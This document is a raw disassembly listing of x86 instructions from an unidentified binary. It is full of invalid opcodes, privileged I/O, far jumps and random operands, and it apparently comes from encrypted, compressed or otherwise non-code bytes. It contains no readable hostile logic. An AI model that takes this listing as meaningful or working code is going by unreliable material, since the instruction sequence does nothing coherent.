  42dbeb:	xor    ah,ah
  42dbed:	dec    edi
  42dbee:	cmp    eax,0x186c3547
  42dbf3:	xor    ebx,DWORD PTR [eax+0x62]
  42dbf6:	sbb    ebx,DWORD PTR [edx+0x3286b411]
  42dbfc:	xchg   esi,eax
  42dbfd:	cld    
  42dbfe:	cmp    DWORD PTR [esi],edx
  42dc00:	out    0xf5,eax
  42dc02:	push   ebp
  42dc03:	cmc    
  42dc04:	add    DWORD PTR [edx+ebx*8],ebx
  42dc07:	pop    ds
  42dc08:	sub    eax,0xde4db9dd
  42dc0d:	sub    DWORD PTR [edi],ecx
  42dc0f:	addr16 push cs
  42dc11:	xchg   DWORD PTR [esi-0x44fb16e],ecx
  42dc17:	jbe    0x42dc44
  42dc19:	es in  al,0xac
  42dc1c:	pop    ds
  42dc1d:	sub    DWORD PTR [eax-0x65486458],esp
  42dc23:	sub    ch,dh
  42dc25:	neg    BYTE PTR [ebx+edi*4-0x580d0da9]
  42dc2c:	cwde   
  42dc2d:	mov    bh,0xef
  42dc2f:	push   esi
  42dc30:	mov    ebx,DWORD PTR [edx+0x60]
  42dc33:	pop    ecx
  42dc34:	es inc ebp
  42dc36:	adc    esi,DWORD PTR [esi+0x48]
  42dc39:	xchg   esi,eax
  42dc3a:	lea    ebx,[ecx]
  42dc3c:	push   cs
  42dc3d:	xchg   BYTE PTR [ebp-0x12b3b9fa],bl
  42dc43:	sub    BYTE PTR [esi-0x46],bl
  42dc46:	fidivr WORD PTR [ecx+0x5]
  42dc49:	int3   
  42dc4a:	(bad)  
  42dc4b:	or     ah,BYTE PTR [edx+ebp*4+0x73]
  42dc4f:	out    dx,eax
  42dc50:	out    dx,eax
  42dc51:	jbe    0x42dcca
  42dc53:	and    esi,DWORD PTR [edx-0x27a36a30]
  42dc59:	jmp    0x43e1cbf2
  42dc5e:	mov    bl,0xa8
  42dc60:	push   eax
  42dc61:	sub    BYTE PTR [ecx],cl
  42dc63:	loope  0x42dc38
  42dc65:	push   es
  42dc66:	or     al,BYTE PTR [ecx]
  42dc68:	mov    al,0x2b
  42dc6a:	loope  0x42dcae
  42dc6c:	retf   0x8815
  42dc6f:	xchg   esi,eax
  42dc70:	jb     0x42dcda
  42dc72:	shl    DWORD PTR [ebx],0x22
  42dc75:	pop    ss
  42dc76:	data16 fdivr st(2),st
  42dc79:	push   DWORD PTR [ebx+0x44767ffa]
  42dc7f:	adc    DWORD PTR [edi],eax
  42dc81:	retf   
  42dc82:	pop    ebx
  42dc83:	mov    ebp,0xff2ad3fd
  42dc88:	xchg   ebx,eax
  42dc89:	fmulp  st(4),st
  42dc8b:	pop    ds
  42dc8c:	lock xor al,0xf6
  42dc8f:	pusha  
  42dc90:	pop    esp
  42dc91:	fistp  DWORD PTR ds:0xe284c3ca
  42dc97:	pop    esp
  42dc98:	push   ss
  42dc99:	out    0x9c,eax
  42dc9b:	pop    ebx
  42dc9c:	mov    edx,DWORD PTR [eax-0x556ad5c3]
  42dca2:	leave  
  42dca3:	mov    ebx,DWORD PTR [edx+0x5e]
  42dca6:	cmp    BYTE PTR [ebx],cl
  42dca8:	sub    bl,BYTE PTR [ecx]
  42dcaa:	pop    edx
  42dcab:	xchg   ebx,eax
  42dcac:	je     0x42dc65
  42dcae:	push   es
  42dcaf:	mov    cs,edx
  42dcb1:	jg     0x42dcf3
  42dcb3:	jp     0x42dc5d
  42dcb5:	adc    ebp,DWORD PTR [esi]
  42dcb7:	jbe    0x42dc49
  42dcb9:	mov    es,WORD PTR [eax+eiz*1+0x29]
  42dcbd:	mov    BYTE PTR [esi+0x535e],dh
	...
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x224ef0be]
  42dd44:	push   ds
  42dd45:	in     al,0x1
  42dd47:	add    ch,dh
  42dd49:	add    BYTE PTR [eax],al
  42dd4b:	add    BYTE PTR [edi-0x2f],al
  42dd4e:	bound  ebp,QWORD PTR [eax+0x1c]
  42dd51:	push   edx
  42dd52:	cmp    ebp,DWORD PTR [ebp+0x39]
  42dd55:	dec    ecx
  42dd56:	arpl   WORD PTR [ebx+edx*8+0x4a],ax
  42dd5a:	or     ch,ch
  42dd5c:	int3   
  42dd5d:	pop    ecx
  42dd5e:	pop    edx
  42dd5f:	mov    ch,al
  42dd61:	adc    esp,ebx
  42dd63:	jb     0x42ddb0
  42dd65:	mov    eax,ds:0x7a68d978
  42dd6a:	icebp  
  42dd6b:	xchg   esi,eax
  42dd6c:	xchg   ecx,eax
  42dd6d:	mov    eax,DWORD PTR [eax]
  42dd6f:	ret    
  42dd70:	or     eax,0xf11e4e6d
  42dd75:	or     dh,BYTE PTR [ecx+eiz*1+0x2e]
  42dd79:	cmp    al,bl
  42dd7b:	push   ds
  42dd7c:	xchg   edi,eax
  42dd7d:	jl     0x42dd41
  42dd7f:	dec    edx
  42dd80:	sub    eax,DWORD PTR [ebp+0x39]
  42dd83:	xchg   edi,eax
  42dd84:	xchg   edi,eax
  42dd85:	mov    eax,ds:0x26c57fe5
  42dd8a:	mov    ah,0x83
  42dd8c:	mov    BYTE PTR [ebp*8+0x584ed68e],ch
  42dd93:	lock in eax,0xe6
  42dd96:	inc    ebp
  42dd97:	icebp  
  42dd98:	hlt    
  42dd99:	shl    cl,1
  42dd9b:	xchg   edi,eax
  42dd9c:	(bad)  
  42dd9d:	xor    eax,0x914f5283
  42dda2:	cmp    edi,esi
  42dda4:	fsub   DWORD PTR [esi]
  42dda6:	dec    ebp
  42dda7:	aas    
  42dda8:	shl    ecx,cl
  42ddaa:	test   eax,0xf9623e3b
  42ddaf:	dec    esp
  42ddb0:	jno    0x42dd42
  42ddb2:	dec    edx
  42ddb3:	call   0xacbc:0x1e9673c1
  42ddba:	adc    BYTE PTR ss:[eax],al
  42ddbd:	ins    BYTE PTR es:[edi],dx
  42ddbe:	mov    ebp,0xbc8d8212
  42ddc3:	xor    BYTE PTR [ecx],0x1
  42ddc6:	cmp    ch,BYTE PTR [esi+0x6e]
  42ddc9:	into   
  42ddca:	mov    WORD PTR [edx],gs
  42ddcc:	xor    eax,0x1ea0e0ac
  42ddd1:	cs dec edx
  42ddd3:	jmp    0x237:0x70251145
  42ddda:	dec    eax
  42dddb:	(bad)  
  42dddc:	xor    bl,BYTE PTR [ebx+0xd]
  42dddf:	push   es
  42dde0:	mov    dh,0x8d
  42dde2:	mov    edi,0xdae080a
  42dde7:	frstor [esi+esi*4-0x13]
  42ddeb:	sbb    ah,BYTE PTR [ebx-0x3a]
  42ddee:	jmp    0x9ddb:0x842ac0b6
  42ddf5:	push   0x48b9efd5
  42ddfa:	pop    ss
  42ddfb:	sub    BYTE PTR [ebp-0x75],ch
  42ddfe:	xor    BYTE PTR [edx+ecx*2],0x21
  42de02:	ret    0x65e6
  42de05:	(bad)  
  42de06:	fistp  DWORD PTR [edx+0x7]
  42de09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de0a:	icebp  
  42de0b:	mov    edi,0x8a65d965
  42de10:	stos   BYTE PTR es:[edi],al
  42de11:	xchg   edx,eax
  42de12:	mov    ds:0x9bfb76ff,eax
  42de17:	mov    eax,edi
  42de19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de1a:	es loopne 0x42dda1
  42de1d:	jle    0x42ddce
  42de1f:	das    
  42de20:	mov    ebp,0xc816390a
  42de25:	adc    DWORD PTR ds:0x548600e2,esi
  42de2b:	(bad)  
  42de2c:	push   eax
  42de2d:	popf   
  42de2e:	bound  eax,QWORD PTR [edx+0x6dbb48c4]
  42de34:	or     eax,0xaf8e4cc0
  42de39:	std    
  42de3a:	outs   dx,DWORD PTR ds:[esi]
  42de3b:	cmc    
  42de3c:	jb     0x42deb0
  42de3e:	sub    al,BYTE PTR [edi]
  42de40:	sti    
	...
  42deb1:	add    BYTE PTR [eax],al
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi-0x64e029f4]
  42dec3:	jae    0x42ded8
  42dec5:	in     eax,0x1
  42dec7:	add    ch,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [esi-0x4d],bl
  42dece:	jb     0x42de6e
  42ded0:	adc    ebx,0x85d44955
  42ded6:	jo     0x42dee4
  42ded8:	scas   eax,DWORD PTR es:[edi]
  42ded9:	mov    esi,0xd8cb2c70
  42dede:	or     edx,DWORD PTR [ebp+0x56977485]
  42dee4:	retf   
  42dee5:	mov    bh,0x14
  42dee7:	pop    ebx
  42dee8:	sub    BYTE PTR [ebx],0xfa
  42deeb:	mov    ds:0xff36dcb8,al
  42def0:	in     al,dx
  42def1:	rol    DWORD PTR [ecx-0x4389a4b1],0x9d
  42def8:	fsub   QWORD PTR [edi+0x20]
  42defb:	jne    0x42def1
  42defd:	mov    ebp,0xc8ff7934
  42df02:	fsub   QWORD PTR [ecx+0x6b522908]
  42df08:	sbb    al,0x90
  42df0a:	shl    BYTE PTR ds:0xd863145a,1
  42df10:	test   bl,bl
  42df12:	in     eax,0x86
  42df14:	adc    DWORD PTR [edx],ebp
  42df16:	mov    bl,0x8f
  42df18:	daa    
  42df19:	neg    BYTE PTR [edi+0x5c]
  42df1c:	je     0x42df2a
  42df1e:	pusha  
  42df1f:	(bad)  
  42df20:	sti    
  42df21:	and    DWORD PTR [ebp+0x5e],esi
  42df24:	adc    al,BYTE PTR [edi-0x73e750f3]
  42df2a:	dec    edx
  42df2b:	mov    ecx,0x6d859b64
  42df30:	aam    0x95
  42df32:	xchg   BYTE PTR [ecx+0x6a],bh
  42df35:	adc    dl,BYTE PTR [ebx-0x2b]
  42df38:	mov    ecx,0x5a4d9f17
  42df3d:	push   esp
  42df3e:	rcr    BYTE PTR [edx-0x4],0x61
  42df42:	jbe    0x42dfad
  42df44:	in     eax,0x75
  42df46:	dec    edx
  42df47:	stc    
  42df48:	dec    esi
  42df49:	test   cl,cl
  42df4b:	mov    BYTE PTR [eax-0x7cf9c685],al
  42df51:	add    ch,cl
  42df53:	icebp  
  42df54:	scas   eax,DWORD PTR es:[edi]
  42df55:	sub    dh,BYTE PTR [ebx+edi*1-0x25ea05c1]
  42df5c:	enter  0xd7d9,0x7d
  42df60:	adc    edx,DWORD PTR [ebp-0x6c7053f3]
  42df66:	jl     0x42df8f
  42df68:	loop   0x42df23
  42df6a:	sbb    DWORD PTR [esi-0x3b],esp
  42df6d:	sub    DWORD PTR [ebx+ebx*2-0x80],edi
  42df71:	jb     0x42dfac
  42df73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df74:	(bad)  [edi+0x22970709]
  42df7a:	mov    eax,ds:0x8b715d59
  42df7f:	add    dh,ah
  42df81:	fnstsw WORD PTR [edx-0x3f]
  42df84:	cdq    
  42df85:	sahf   
  42df86:	or     al,0xb3
  42df88:	or     DWORD PTR [esi+0x76],ebp
  42df8b:	or     ebx,esp
  42df8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df8e:	xchg   esi,eax
  42df8f:	dec    esi
  42df90:	fwait
  42df91:	cmc    
  42df92:	add    eax,0x6c1ffcf6
  42df97:	call   0xd91b9525
  42df9c:	cdq    
  42df9d:	hlt    
  42df9e:	jne    0x42dff3
  42dfa0:	sub    ebp,0x149e8a62
  42dfa6:	ja     0x42df70
  42dfa8:	daa    
  42dfa9:	imul   esi,DWORD PTR [ecx+0x6aa2de84],0x628ed464
  42dfb3:	loope  0x42dff7
  42dfb5:	ss jle 0x42dfd6
  42dfb8:	std    
  42dfb9:	add    DWORD PTR [edx-0x7b9d0f86],esi
  42dfbf:	xchg   ebp,eax
  42dfc0:	enter  0x0,0x0
	...
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx+0x63cf4de2],0x1d
  42e044:	or     dh,ah
  42e046:	add    DWORD PTR [eax],eax
  42e048:	cmc    
  42e049:	add    BYTE PTR [eax],al
  42e04b:	add    BYTE PTR [ebx+0x48],bl
  42e04e:	cmp    dh,al
  42e050:	les    edx,FWORD PTR [edx]
  42e052:	loopne 0x42dfd7
  42e054:	retf   
  42e055:	dec    ebx
  42e056:	dec    ecx
  42e057:	test   DWORD PTR [edi],edx
  42e059:	xor    dh,BYTE PTR [ebp+0x6704dfab]
  42e05f:	pop    eax
  42e060:	jl     0x42e05f
  42e062:	push   esi
  42e063:	inc    esp
  42e064:	in     eax,dx
  42e065:	clc    
  42e066:	shl    BYTE PTR [edi-0x76],1
  42e069:	lods   al,BYTE PTR ds:[esi]
  42e06a:	mov    ds:0xdadabd20,al
  42e06f:	cmp    BYTE PTR [esi],cl
  42e071:	test   eax,0x317b0afd
  42e076:	push   es
  42e077:	in     al,0x2d
  42e079:	outs   dx,DWORD PTR ds:[esi]
  42e07a:	cmc    
  42e07b:	fimul  WORD PTR [edi+0x32]
  42e07e:	arpl   si,cx
  42e080:	das    
  42e081:	jo     0x42e0f1
  42e083:	inc    ebp
  42e084:	mov    DWORD PTR [ecx],ebx
  42e086:	add    BYTE PTR [edx],dh
  42e088:	(bad)  
  42e089:	dec    esp
  42e08a:	ror    DWORD PTR ds:0x46d1625,0x2d
  42e091:	lahf   
  42e092:	jp     0x42e062
  42e094:	adc    al,0xc5
  42e096:	xchg   ebx,eax
  42e097:	push   eax
  42e098:	not    DWORD PTR [esi]
  42e09a:	rol    BYTE PTR [esi-0x7632c83f],1
  42e0a0:	sahf   
  42e0a1:	(bad)  
  42e0a2:	icebp  
  42e0a3:	inc    esi
  42e0a4:	xor    al,ah
  42e0a6:	mov    ah,0x10
  42e0a8:	jae    0x42e04a
  42e0aa:	cdq    
  42e0ab:	xor    al,0x30
  42e0ad:	sub    dh,BYTE PTR [ebp+esi*2-0x2c]
  42e0b1:	sbb    al,0xfa
  42e0b3:	and    BYTE PTR [edi],dl
  42e0b5:	sbb    eax,0x173b14e
  42e0ba:	lock fs (bad) 
  42e0bd:	adc    edi,DWORD PTR [eax-0x3a7556cc]
  42e0c3:	rcr    BYTE PTR [edi-0x17],0xf0
  42e0c7:	pop    esi
  42e0c8:	dec    esp
  42e0c9:	fimul  DWORD PTR [edi+eax*8+0xefe1448]
  42e0d0:	mov    dl,0x8b
  42e0d2:	dec    ebx
  42e0d4:	scas   al,BYTE PTR es:[edi]
  42e0d5:	sti    
  42e0d6:	mov    DWORD PTR [edi-0x7b],ebx
  42e0d9:	cmp    DWORD PTR [ebx-0x5ee76195],eax
  42e0df:	and    al,0x69
  42e0e1:	daa    
  42e0e2:	inc    ebp
  42e0e3:	cmp    DWORD PTR [ebx],esp
  42e0e5:	in     eax,dx
  42e0e6:	inc    ebp
  42e0e7:	les    esp,FWORD PTR [edi+ecx*1]
  42e0ea:	retf   
  42e0eb:	mov    WORD PTR [ebx+0x76],gs
  42e0ee:	repnz lea esp,[eax]
  42e0f1:	aam    0x23
  42e0f3:	adc    bh,BYTE PTR [esi-0xe856df9]
  42e0f9:	mov    WORD PTR [edi],?
  42e0fb:	xchg   edi,eax
  42e0fc:	mov    dl,0x10
  42e0fe:	jp     0x42e09e
  42e100:	xor    BYTE PTR [ebp+0x2126900],cl
  42e106:	pop    ebx
  42e107:	jo     0x42e109
  42e109:	adc    dh,ah
  42e10b:	sbb    DWORD PTR [ecx],esi
  42e10d:	and    BYTE PTR [edi+0x64],al
  42e110:	push   eax
  42e111:	pop    ds
  42e112:	idiv   dl
  42e114:	stos   BYTE PTR es:[edi],al
  42e115:	dec    esi
  42e116:	jmp    0xb2338b91
  42e11b:	mov    edx,0x7f13ca4b
  42e120:	push   0xe645e6d8
  42e125:	jne    0x42e128
  42e127:	dec    edx
  42e128:	push   edi
  42e129:	fild   DWORD PTR [eax-0x78]
  42e12c:	test   al,0x2b
  42e12e:	xchg   esp,eax
  42e12f:	mov    esp,0x8ea63f12
  42e134:	push   esp
  42e135:	out    dx,al
  42e136:	(bad)  
  42e137:	test   edx,0xec1478b2
  42e13d:	jmp    0x42e105
  42e13f:	push   ecx
  42e140:	out    0x0,al
	...
  42e1b2:	add    BYTE PTR [eax],al
  42e1b4:	lea    ecx,[eax]
  42e1b6:	pop    ebp
  42e1b7:	jbe    0x42e196
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0x525e6c71
  42e1c3:	pop    es
  42e1c4:	std    
  42e1c5:	out    0x1,al
  42e1c7:	add    ch,dh
  42e1c9:	add    BYTE PTR [eax],al
  42e1cb:	add    BYTE PTR [eax-0x1c],ah
  42e1ce:	or     edi,ebp
  42e1d0:	rcr    BYTE PTR [ecx+0x19b307bd],0x3d
  42e1d7:	inc    esp
  42e1d8:	call   0x69f3:0x56d49ccf
  42e1df:	repz mov bh,0x9f
  42e1e2:	(bad)  
  42e1e3:	fs dec ecx
  42e1e5:	pop    ebp
  42e1e6:	pop    es
  42e1e7:	cdq    
  42e1e8:	jns    0x42e25f
  42e1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1eb:	dec    ecx
  42e1ec:	aam    0xaa
  42e1ee:	mov    al,0x89
  42e1f0:	inc    esp
  42e1f1:	dec    eax
  42e1f2:	add    edi,DWORD PTR [edi+eiz*4]
  42e1f5:	cmp    al,0xed
  42e1f7:	ins    DWORD PTR es:[edi],dx
  42e1f8:	test   esi,ecx
  42e1fa:	nop
  42e1fb:	or     BYTE PTR [edi],bh
  42e1fd:	out    0xb3,eax
  42e1ff:	sub    bh,dh
  42e201:	mov    edi,esp
  42e203:	or     eax,0x68011812
  42e208:	fadd   QWORD PTR [edx+0x49efab8a]
  42e20e:	lea    ebp,[eax]
  42e210:	or     eax,edx
  42e212:	add    al,0x55
  42e214:	or     bl,ch
  42e216:	fcom   QWORD PTR [eax+0x8]
  42e219:	loope  0x42e286
  42e21b:	pusha  
  42e21c:	shl    al,cl
  42e21e:	jbe    0x42e29c
  42e220:	aad    0x29
  42e222:	repnz fstp QWORD PTR cs:[esi+0x4e]
  42e227:	sub    ah,BYTE PTR [edx+0x5f]
  42e22a:	retf   
  42e22b:	or     eax,0x8130af5c
  42e230:	mov    edx,0xd55b6807
  42e235:	inc    ebx
  42e236:	cmp    bh,BYTE PTR [edi+ebp*1+0x1fd36001]
  42e23d:	rcl    dh,1
  42e23f:	xchg   esp,eax
  42e240:	xchg   ebx,eax
  42e241:	push   eax
  42e242:	ret    0x3408
  42e245:	mov    eax,ds:0xd765bf79
  42e24a:	fbstp  TBYTE PTR [edi+0x681b22ce]
  42e250:	push   es
  42e251:	jae    0x42e233
  42e253:	stos   BYTE PTR es:[edi],al
  42e254:	jmp    0xdfc0c483
  42e259:	cdq    
  42e25a:	dec    esi
  42e25b:	adc    eax,0x78c1915f
  42e260:	inc    ebx
  42e261:	mov    bl,0x6f
  42e263:	push   edi
  42e264:	push   cs
  42e265:	cmc    
  42e266:	and    bh,cl
  42e268:	bound  edx,QWORD PTR [eax-0x2b]
  42e26b:	std    
  42e26c:	cmp    al,0x7c
  42e26e:	inc    eax
  42e26f:	push   0xffffffa8
  42e271:	xor    BYTE PTR [ecx],dl
  42e273:	sub    ebp,ebx
  42e275:	imul   ebx,DWORD PTR [ecx+0x43],0x4986ac81
  42e27c:	pop    ss
  42e27d:	mov    dl,0xb1
  42e27f:	jl     0x42e213
  42e281:	sub    al,0x14
  42e283:	pop    esi
  42e284:	gs ret 
  42e286:	mov    ah,0x2f
  42e288:	test   DWORD PTR [eax],edx
  42e28a:	jno    0x42e23f
  42e28c:	nop
  42e28d:	or     esi,DWORD PTR [ebx]
  42e28f:	scas   al,BYTE PTR es:[edi]
  42e290:	dec    eax
  42e291:	jb     0x42e21f
  42e293:	mov    edx,0x7ff64dbd
  42e298:	adc    ah,BYTE PTR [edi+0x182d0d24]
  42e29e:	add    al,BYTE PTR [ecx]
  42e2a0:	pushw  ss
  42e2a2:	ret    
  42e2a3:	stos   DWORD PTR es:[edi],eax
  42e2a4:	aaa    
  42e2a5:	pop    esi
  42e2a6:	in     eax,0xcf
  42e2a8:	retf   0x8616
  42e2ab:	repz inc esi
  42e2ad:	xor    cl,BYTE PTR [ebp-0x18]
  42e2b0:	add    BYTE PTR [edi],ch
  42e2b2:	into   
  42e2b3:	sahf   
  42e2b4:	sbb    DWORD PTR [edx+ebp*2],eax
  42e2b7:	mov    al,ds:0x5b4ff527
  42e2bc:	push   cs
  42e2bd:	sahf   
  42e2be:	aaa    
  42e2bf:	lock cmp BYTE PTR [eax],al
	...
  42e332:	add    BYTE PTR [eax],al
  42e334:	ror    esi,0x63
  42e337:	cdq    
  42e338:	outs   dx,DWORD PTR ds:[esi]
  42e339:	mov    ebp,0x5146defb
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [edx-0x28],eax
  42e342:	add    eax,0x1e7f2a6
  42e347:	add    ch,dh
  42e349:	add    BYTE PTR [eax],al
  42e34b:	add    BYTE PTR [ebx+0x23c441b0],dh
  42e351:	dec    edx
  42e352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e353:	dec    esi
  42e354:	adc    BYTE PTR [edx],ah
  42e356:	push   ebx
  42e357:	in     eax,dx
  42e358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e359:	fiadd  WORD PTR [ebx]
  42e35b:	mov    ebp,0xb2d39145
  42e360:	popf   
  42e361:	in     eax,dx
  42e362:	or     al,BYTE PTR [ebx]
  42e364:	emms   
  42e366:	pop    eax
  42e367:	fdivr  QWORD PTR [esi-0x18867350]
  42e36d:	dec    esi
  42e36e:	stos   BYTE PTR es:[edi],al
  42e36f:	out    dx,al
  42e370:	test   DWORD PTR [edi+0x5],0x4f4f8c2
  42e377:	setge  BYTE PTR [eax-0x59a2332]
  42e37e:	gs jno 0x42e351
  42e381:	mov    ds:0xa259e183,al
  42e387:	mov    bh,BYTE PTR [edx-0x16]
  42e38a:	sub    al,0x80
  42e38c:	add    DWORD PTR [ebx],0x4e
  42e38f:	stc    
  42e390:	mov    ebp,0x4ae10674
  42e395:	call   0x50f82f94
  42e39a:	adc    bh,BYTE PTR [edx]
  42e39c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e39d:	xlat   BYTE PTR ds:[ebx]
  42e39e:	fwait
  42e39f:	jnp    0x42e322
  42e3a1:	adc    BYTE PTR ds:0x8e883275,bl
  42e3a7:	xchg   ecx,eax
  42e3a8:	pusha  
  42e3a9:	jg     0x42e356
  42e3ab:	aas    
  42e3ac:	sbb    al,0xd4
  42e3ae:	fs addr16 daa 
  42e3b1:	ja     0x42e405
  42e3b3:	stos   BYTE PTR es:[edi],al
  42e3b4:	out    0x4,al
  42e3b6:	addr16 pop ecx
  42e3b8:	add    ch,BYTE PTR [ebx-0x24]
  42e3bb:	pop    ds
  42e3bc:	or     eax,0xb74122ec
  42e3c1:	mov    bh,0xd5
  42e3c3:	sub    ah,bh
  42e3c5:	sbb    BYTE PTR [ebp+0x28d0cea7],bl
  42e3cb:	scas   al,BYTE PTR es:[edi]
  42e3cc:	shr    ch,1
  42e3ce:	push   ebx
  42e3cf:	xor    ebx,esi
  42e3d1:	scas   eax,DWORD PTR es:[edi]
  42e3d2:	ss sub eax,0x87f0df6
  42e3d8:	cmp    BYTE PTR ds:0xe6c8adfd,bh
  42e3de:	cmp    al,0x84
  42e3e0:	es mov ch,0xf2
  42e3e3:	cmp    al,dh
  42e3e5:	push   ebx
  42e3e6:	mov    cl,0xf9
  42e3e8:	(bad)  
  42e3e9:	mov    eax,0x22516689
  42e3ee:	outs   dx,BYTE PTR ds:[esi]
  42e3ef:	shl    BYTE PTR [ebx],1
  42e3f1:	or     ebx,DWORD PTR [ecx]
  42e3f3:	add    BYTE PTR [ebx],dh
  42e3f5:	fcom   QWORD PTR [ecx-0x7f]
  42e3f8:	push   eax
  42e3f9:	ins    DWORD PTR es:[edi],dx
  42e3fa:	adc    al,0x62
  42e3fc:	fdiv   QWORD PTR [ecx]
  42e3fe:	xchg   ebx,eax
  42e3ff:	aad    0x6a
  42e401:	cwde   
  42e402:	test   DWORD PTR [edi+0x7242ce56],ebx
  42e408:	pusha  
  42e409:	pop    edx
  42e40a:	dec    esp
  42e40b:	sahf   
  42e40c:	dec    ecx
  42e40d:	ja     0x42e42d
  42e40f:	and    edx,DWORD PTR [ebx+0xaf9659d]
  42e415:	(bad)  
  42e416:	fadd   DWORD PTR [edi]
  42e418:	mov    bh,0xb4
  42e41a:	add    BYTE PTR [ecx+0x5a37fff8],ah
  42e420:	dec    esi
  42e421:	mov    edx,0xd107c6c0
  42e426:	xchg   ebx,eax
  42e427:	xchg   ebp,eax
  42e428:	pop    ecx
  42e429:	aas    
  42e42a:	mov    bh,0x9f
  42e42c:	sub    DWORD PTR [edi-0x576fc3f9],ecx
  42e432:	push   edx
  42e433:	cmp    al,0xa8
  42e435:	mov    BYTE PTR [esi],ah
  42e437:	mov    BYTE PTR [eax],al
  42e439:	out    dx,eax
  42e43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e43b:	outs   dx,DWORD PTR ds:[esi]
  42e43c:	call   0x24fa818b
	...
  42e4b1:	add    BYTE PTR [eax],al
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0xf34d7fe2
  42e4c4:	out    0xe8,eax
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	cmc    
  42e4c9:	add    BYTE PTR [eax],al
  42e4cb:	add    BYTE PTR [edx+ebx*2+0x78fcc8bf],ah
  42e4d2:	inc    esp
  42e4d3:	pushf  
  42e4d4:	xchg   ebx,eax
  42e4d5:	clc    
  42e4d6:	mov    edi,eax
  42e4d8:	xlat   BYTE PTR ds:[ebx]
  42e4d9:	pop    es
  42e4da:	push   ss
  42e4db:	stos   BYTE PTR es:[edi],al
  42e4dc:	pop    ss
  42e4dd:	or     DWORD PTR [ebp+0x5f5b02a8],esi
  42e4e3:	cmp    bh,BYTE PTR [ecx+eiz*8]
  42e4e6:	add    ecx,DWORD PTR [esi]
  42e4e8:	ja     0x42e4b3
  42e4ea:	test   DWORD PTR [esi],edi
  42e4ec:	sbb    al,0x43
  42e4ee:	loope  0x42e4a3
  42e4f0:	pop    ss
  42e4f1:	pusha  
  42e4f2:	lea    ebx,[esi+0x73]
  42e4f5:	sbb    edx,DWORD PTR [edx+ebx*2+0xd74539a]
  42e4fc:	mov    ebp,0x595a4e59
  42e501:	mov    dh,0xfa
  42e503:	repz inc esi
  42e505:	loope  0x42e49f
  42e507:	jne    0x42e4d8
  42e509:	lds    edx,FWORD PTR [ebp+0x50]
  42e50c:	add    BYTE PTR [edx+0x75],0xcd
  42e510:	enter  0x939,0xcf
  42e514:	cmp    DWORD PTR [esp+edi*4-0x30],0xd710a11f
  42e51c:	in     eax,dx
  42e51d:	inc    edx
  42e51e:	push   ebp
  42e51f:	ja     0x42e59d
  42e521:	lea    edx,[edi-0x4f223425]
  42e527:	iret   
  42e528:	push   cs
  42e529:	das    
  42e52a:	and    al,0x1a
  42e52c:	xchg   esi,eax
  42e52d:	mov    ds:0xdfae129b,al
  42e532:	clc    
  42e533:	sbb    edi,DWORD PTR [ebp+0x7314aaf7]
  42e539:	mov    al,es:0x47b25eb9
  42e53f:	dec    esi
  42e540:	or     al,0x4a
  42e542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e543:	or     bh,dl
  42e545:	and    BYTE PTR [ebp-0x4d475e61],dl
  42e54b:	push   ebx
  42e54c:	push   cs
  42e54d:	mov    ss,WORD PTR [esp+eiz*2]
  42e550:	cmp    DWORD PTR [ebx+0x4d9824a1],ebx
  42e556:	xchg   ebx,eax
  42e557:	cmp    al,BYTE PTR [ebp-0x5f]
  42e55a:	xor    eax,0xf1bf57ec
  42e55f:	test   BYTE PTR [ebp+0xc5a2cad],0x24
  42e566:	int3   
  42e567:	cli    
  42e568:	cmp    al,0xbb
  42e56a:	retf   
  42e56b:	add    al,0x30
  42e56d:	jae    0x42e5ac
  42e56f:	pop    ebx
  42e570:	xchg   edi,eax
  42e571:	fld    DWORD PTR [edx]
  42e573:	outs   dx,DWORD PTR ds:[esi]
  42e574:	lock cwde 
  42e576:	dec    ebx
  42e577:	sub    al,0x56
  42e579:	aaa    
  42e57a:	lock and esp,esp
  42e57d:	enter  0x786b,0x55
  42e581:	clc    
  42e582:	inc    ebp
  42e583:	aaa    
  42e584:	mov    ebp,0xf57ca972
  42e589:	ja     0x42e52e
  42e58b:	jno    0x42e5d0
  42e58d:	push   0xf472fbab
  42e592:	mov    ch,0x22
  42e594:	push   ecx
  42e595:	ja     0x42e546
  42e597:	dec    ebx
  42e598:	xor    al,0xef
  42e59a:	loop   0x42e52d
  42e59c:	xchg   ebx,eax
  42e59d:	jmp    0xcc66:0x64d40ebf
  42e5a4:	push   edi
  42e5a5:	sbb    BYTE PTR [edi],0x97
  42e5a8:	jmp    0xe8cfdc8f
  42e5ad:	dec    ecx
  42e5ae:	in     al,dx
  42e5af:	xchg   esp,eax
  42e5b0:	pushf  
  42e5b1:	ficom  DWORD PTR [edx+0x4]
  42e5b4:	pop    DWORD PTR [ebp-0x7c]
  42e5b7:	pop    ss
  42e5b8:	jae    0x42e5f7
  42e5ba:	fild   DWORD PTR [esi+0x1d]
